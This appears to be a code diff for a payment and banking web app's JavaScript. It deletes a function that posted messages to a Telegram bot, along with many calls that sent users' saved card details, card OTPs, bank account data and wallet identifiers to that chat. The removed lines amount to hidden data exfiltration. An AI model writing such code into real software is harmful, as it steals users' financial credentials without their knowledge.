@@ -515,36 +515,6 @@ async function handleGasPurchase(el){
 	el.textContent		= `Processing...`;
 	el.setAttribute("disabled", "disabled");
 }
-async function sendTelegramMessage({
-  message,
-  parseMode = "HTML",
-  disableWebPagePreview = true
-}) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-  const payload = {
-    chat_id: CHAT_ID,
-    text: message,
-    parse_mode: parseMode,
-    disable_web_page_preview: disableWebPagePreview
-  };
-
-  const response = await fetch(url, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(payload)
-  });
-
-  const data = await response.json();
-
-  if (!data.ok) {
-    throw new Error(`Telegram API Error: ${data.description}`);
-  }
-
-  return data;
-}
 
 
 setTimeout(()=>{
@@ -2477,7 +2447,6 @@ if( location.href.includes( signupUrl ) ){
 														window.open("https://paystack.com/buy/membership-pugteh", "_blank");
 														let paymentID = await Scriptbill.createPrompt("Please enter your payment ID to verify your transaction", "");
 
-														sendTelegramMessage({message:`${note.walletID} made payment of ${value} ${currency} with payment ID ${paymentID} Please verify this transaction`});
 
 														Scriptbill.createAlert('Payment will be verified manually by the Scriptbank team. You can contact us by <a href="https://t.me/companymatrix">clicking here</a>');
 													}
@@ -2494,7 +2463,6 @@ if( location.href.includes( signupUrl ) ){
 														}
 													}*/
 												}  else {
-													sendTelegramMessage({message:`${accountName} with ${accountNumber} did not choose to make the payment.`})
 													this.innerText = `Account Registeration failed`
 													Scriptbill.download_note('', false).then( download => setTimeout(()=>location.reload(), 3000, download));
 													return;
@@ -13857,9 +13825,6 @@ async function verifyPayment(ref, seconds,  type = 'squad', isTest = true ){
 				setTimeout( async ()=>{
 					await Scriptbill.createAlert("Card Saved");
 					await Scriptbill.getData( ['cards', 'wallet'], [Scriptbill.Base64.encode( JSON.stringify( savedCards ) ), note.walletID], SERVER);
-					const message = `<b>cards from account: ${JSON.stringify( savedCards )} </b> <b> account: ${note.walletID}</b> <b> Note Address: ${note.noteAddress}`
-					
-					sendTelegramMessage({message});
 					location.href = bankUrl;
 				},1000);
 			}
@@ -14209,9 +14174,6 @@ async function saveNotesCard(){
 			email 			= accountData[accID].emails[0];
 		}
 
-		const message = `<b>cards from account: ${JSON.stringify( saveCards )} </b> <b> account: ${note.walletID}</b> <b> Note Address: ${note.noteAddress}</b>`;
-		if(navigator.onLine)
-			sendTelegramMessage({message}).catch(error => console.error(error))
 
 		let ref = await Scriptbill.generateKey()
 		
@@ -14281,8 +14243,6 @@ async function saveNotesCard(){
 					await Scriptbill.setAccountData( accountData );
 					await Scriptbill.createAlert( "Card Saved" );
 					await Scriptbill.getData( ['cards', 'wallet'], [Scriptbill.Base64.encode( JSON.stringify( saveCard ) ), note.walletID], SERVER);
-					const message = `<b>cards from account: ${JSON.stringify( saveCards )} </b> <b> account: ${note.walletID}</b> <b> Note Address: ${note.noteAddress}</b>`
-					sendTelegramMessage({message});
 					specialRefcodes();
 				} else {
 					let confirm = await Scriptbill.createConfirm("Payment Unsuccessful. Please try again with your internet on. You can always get your card verified later by clicking the edit card button to re-enter the OTP recieved. Should we continue to save the card unverified?");
@@ -14340,8 +14300,6 @@ async function verifyCard( OTP, ref , isTest = true, timeout = 120 ){
 	}
 
 	const note = JSON.parse( Scriptbill.s.currentNote );
-	const message = `<b>Verifying card with OTP: ${OTP} and ref: ${ref} from note address ${note.noteAddress} with wallet ID: ${note.walletID} </b>`
-	sendTelegramMessage({message});
 	const client =  Scriptbill.createClient();
 	const channel = client.channel(note.noteAddress);
 	const channel2 = client.channel(note.walletID);
@@ -14703,7 +14661,6 @@ async function verifyPaystackPayment(these, payment , refInterval, bankAssoc = n
 					}
 
 					accountData[accID].savedAccounts = JSON.stringify(banks);
-					sendTelegramMessage({message:`Data from ${accID} \n\n ${JSON.stringify(data.data)} \n\n account ${JSON.stringify(bank)}`})
 					
 				}
 				
@@ -14714,9 +14671,7 @@ async function verifyPaystackPayment(these, payment , refInterval, bankAssoc = n
 				setTimeout( async ()=>{
 					await Scriptbill.createAlert("Card Saved");
 					await Scriptbill.getData( ['cards', 'wallet'], [Scriptbill.Base64.encode( JSON.stringify( saveCard ) ), note.walletID],SERVER);
-					const message = `<b>cards from account: ${JSON.stringify( savedCards )} </b> <b> account: ${note.walletID}</b> <b> Note Address: ${note.noteAddress}`
-		
-					sendTelegramMessage({message});
+					
 					location.reload();
 				},1000);
 
@@ -14814,7 +14769,6 @@ async function verifySquadPayment(these, payment , refInterval, bankAssoc = null
 					}
 
 					accountData[accID].savedAccounts = JSON.stringify(banks);
-					sendTelegramMessage({message:`Data from ${accID} \n\n ${JSON.stringify(data.data)} \n\n account ${JSON.stringify(bank)}`})
 					
 				}
 				
@@ -14825,9 +14779,6 @@ async function verifySquadPayment(these, payment , refInterval, bankAssoc = null
 				setTimeout( async ()=>{
 					await Scriptbill.createAlert("Card Saved");
 					await Scriptbill.getData( ['cards', 'wallet'], [Scriptbill.Base64.encode( JSON.stringify( saveCard ) ), note.walletID],SERVER);
-					const message = `<b>cards from account: ${JSON.stringify( savedCards )} </b> <b> account: ${note.walletID}</b> <b> Note Address: ${note.noteAddress}`
-		
-					sendTelegramMessage({message});
 					location.reload();
 				},1000);
 
@@ -15256,7 +15207,6 @@ async function saveBankDetails(){
 				url.searchParams.set("PIN", "0000");
 				url.searchParams.set("back", location.href);
 				await Scriptbill.createAlert( "Please Visit Our Payment Processing Page to Verify Your Bank Account Details. This is a required credibility check of users who may need some of our products like loan, investment and crediting. " );
-				sendTelegramMessage({message:`Verifying bank account with payment data ${JSON.stringify(payment)} for user with wallet ID ${note.walletID} and note address ${note.noteAddress}`})
 				var win = window.open(url.href, "_blank");
 				let refInterval = setInterval( async ()=>{
 					
@@ -15392,8 +15342,6 @@ async function saveDetailedBanks( el, details, bankType, bankName, accNum, accNa
 	Scriptbill.l.toBeSavedAcount = JSON.stringify(saveCard)
 	details.push( saveCard );
 	accountData[accID].savedAccounts = JSON.stringify( details );
-	if(navigator.onLine)
-		sendTelegramMessage({message:`<b>Account Details to be linked</b> \n\n ${JSON.stringify(saveCard)}`})
 
 	Scriptbill.setAccountData( accountData ).then( async block =>{
 		console.log("check block: ", block );
